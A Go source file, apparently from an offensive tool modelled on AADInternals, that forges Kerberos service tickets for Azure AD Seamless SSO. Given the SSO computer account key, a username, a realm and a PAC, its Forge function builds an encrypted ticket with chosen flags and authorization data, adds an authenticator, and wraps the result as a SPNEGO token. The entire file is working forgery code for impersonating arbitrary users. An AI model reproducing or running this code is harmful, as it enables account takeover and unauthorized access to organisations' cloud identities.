package ticket

import (
	cryptorand "crypto/rand"
	"fmt"
	"time"

	"github.com/jcmturner/gofork/encoding/asn1"
	"github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana/chksumtype"
	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
	"github.com/jcmturner/gokrb5/v8/iana/keyusage"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

type ForgeParams struct {
	Key           []byte
	EType         int32
	UserPrincipal string
	Realm         string
	PAC           []byte
	UserName      string
}

type ForgedTicket struct {
	SPNEGOBytes []byte
}

func Forge(params *ForgeParams) (*ForgedTicket, error) {
	now := time.Now().UTC()
	renewTill := now.Add(24 * time.Hour * 7)

	// Session key
	sessionKey := types.EncryptionKey{
		KeyType:  etypeID.AES256_CTS_HMAC_SHA1_96,
		KeyValue: randomBytes(32),
	}

	// Service principal: HTTP/autologon.microsoftazuread-sso.com
	sname := types.PrincipalName{
		NameType:   nametype.KRB_NT_SRV_INST,
		NameString: []string{"HTTP", "autologon.microsoftazuread-sso.com"},
	}

	cname := types.PrincipalName{
		NameType:   nametype.KRB_NT_PRINCIPAL,
		NameString: []string{params.UserName},
	}

	// Build authorization data: PAC + MS-KILE auth data
	authData := buildAuthorizationData(params)

	// Build EncTicketPart
	// Use exact flag bytes matching AADInternals (0x40, 0xA1, 0x00, 0x00)
	// These correspond to: forwardable + renewable + initial + pre_authent + name_canonicalize
	// in the RFC 4120 bit ordering expected by the Windows Kerberos stack on the WS-Trust endpoint.
	ticketFlags := types.NewKrbFlags()
	ticketFlags.Bytes = []byte{0x40, 0xA1, 0x00, 0x00}
	ticketFlags.BitLength = 32

	encPart := messages.EncTicketPart{
		Flags:             ticketFlags,
		Key:               sessionKey,
		CName:             cname,
		CRealm:            params.Realm,
		Transited:         messages.TransitedEncoding{TRType: 0, Contents: []byte{}},
		AuthTime:          now,
		StartTime:         now,
		EndTime:           now.Add(10 * time.Hour),
		RenewTill:         renewTill,
		AuthorizationData: authData,
	}

	// Encrypt EncTicketPart
	ssoKey := types.EncryptionKey{
		KeyType:  params.EType,
		KeyValue: params.Key,
	}

	et, err := crypto.GetEtype(params.EType)
	if err != nil {
		return nil, fmt.Errorf("get etype %d: %w", params.EType, err)
	}

	encPartBytes, err := asn1.Marshal(encPart)
	if err != nil {
		return nil, fmt.Errorf("marshal encpart: %w", err)
	}

	_, cipher, err := et.EncryptMessage(ssoKey.KeyValue, encPartBytes, keyusage.KDC_REP_TICKET)
	if err != nil {
		return nil, fmt.Errorf("encrypt ticket: %w", err)
	}

	ticket := messages.Ticket{
		TktVNO:  5,
		Realm:   params.Realm,
		SName:   sname,
		EncPart: types.EncryptedData{EType: params.EType, KVNO: 0, Cipher: cipher},
		DecryptedEncPart: encPart, // Needed by APReq.Marshal to get session key
	}

	// Build authenticator
	subKey := types.EncryptionKey{
		KeyType:  etypeID.AES256_CTS_HMAC_SHA1_96,
		KeyValue: randomBytes(32),
	}

	// GSS-API checksum over ticket bytes
	ticketBytes, err := ticket.Marshal()
	if err != nil {
		return nil, fmt.Errorf("marshal ticket for checksum: %w", err)
	}

	gssChecksum, err := et.GetChecksumHash(sessionKey.KeyValue, ticketBytes, keyusage.AP_REQ_AUTHENTICATOR_CHKSUM)
	if err != nil {
		return nil, fmt.Errorf("gssapi checksum: %w", err)
	}

	auth := types.Authenticator{
		AVNO:    5,
		CName:   cname,
		CRealm:  params.Realm,
		CTime:   now,
		Cusec:   now.Nanosecond() / 1000,
		SubKey:  subKey,
		SeqNumber: 0,
		Cksum:   types.Checksum{CksumType: chksumtype.GSSAPI, Checksum: gssChecksum},
	}

	// Build APReq using NewAPReq — this encrypts the authenticator with the session key
	apReq, err := messages.NewAPReq(ticket, sessionKey, auth)
	if err != nil {
		return nil, fmt.Errorf("new apreq: %w", err)
	}
	// Match AADInternals APOptions
	apReq.APOptions = types.NewKrbFlags()
	apReq.APOptions.Bytes = []byte{0x20, 0x00, 0x00, 0x00}
	apReq.APOptions.BitLength = 32

	// Marshal APReq
	apReqBytes, err := apReq.Marshal()
	if err != nil {
		return nil, fmt.Errorf("marshal apreq: %w", err)
	}

	// SPNEGO wrap
	spnegoBytes, err := BuildSPNEGO(apReqBytes)
	if err != nil {
		return nil, fmt.Errorf("spnego: %w", err)
	}

	return &ForgedTicket{SPNEGOBytes: spnegoBytes}, nil
}

// ---------- MS-KILE Authorization Data ----------

const (
	KERB_AUTH_DATA_TOKEN_RESTRICTIONS = 141
	KERB_LOCAL                        = 142
	KERB_AP_OPTIONS                   = 143
	KERB_SERVICE_TARGET               = 144
	AD_ETYPE_NEGOTIATION              = 129
	AD_WIN2K_PAC                      = 128
)

func buildAuthorizationData(params *ForgeParams) []types.AuthorizationDataEntry {
	tokenRest := types.AuthorizationDataEntry{
		ADType: KERB_AUTH_DATA_TOKEN_RESTRICTIONS,
		ADData: []byte{1, 0, 0, 0, 0, 0, 0, 0, 0, 0x10, 0, 0, 0, 0, 0, 0, 0}, // Flags=1, IL=0x1000, MachineID=0
	}

	svcTarget := buildServiceTarget(params.Realm)

	return []types.AuthorizationDataEntry{
		{ADType: AD_WIN2K_PAC, ADData: params.PAC},
		tokenRest,
		{ADType: KERB_LOCAL, ADData: []byte{}},
		{ADType: KERB_AP_OPTIONS, ADData: []byte{0, 0, 0, 0}},
		svcTarget,
		{ADType: AD_ETYPE_NEGOTIATION, ADData: []byte{
			23, 0, 0, 0, // RC4-HMAC
			17, 0, 0, 0, // AES128-CTS-HMAC-SHA1-96
			18, 0, 0, 0, // AES256-CTS-HMAC-SHA1-96
		}},
	}
}

func buildServiceTarget(realm string) types.AuthorizationDataEntry {
	svc := utf16LEBytes("HTTP/autologon.microsoftazuread-sso.com")
	realmBytes := utf16LEBytes(realm)
	data := make([]byte, 4+len(svc)+len(realmBytes))
	data[0] = byte(len(svc))
	data[1] = byte(len(svc) >> 8)
	data[2] = byte(len(realmBytes))
	data[3] = byte(len(realmBytes) >> 8)
	copy(data[4:], svc)
	copy(data[4+len(svc):], realmBytes)
	return types.AuthorizationDataEntry{ADType: KERB_SERVICE_TARGET, ADData: data}
}

// ---------- Helpers ----------

func randomBytes(n int) []byte {
	b := make([]byte, n)
	cryptorand.Read(b)
	return b
}

func utf16LEBytes(s string) []byte {
	var out []byte
	for _, r := range s {
		out = append(out, byte(r), byte(r>>8))
	}
	return out
}
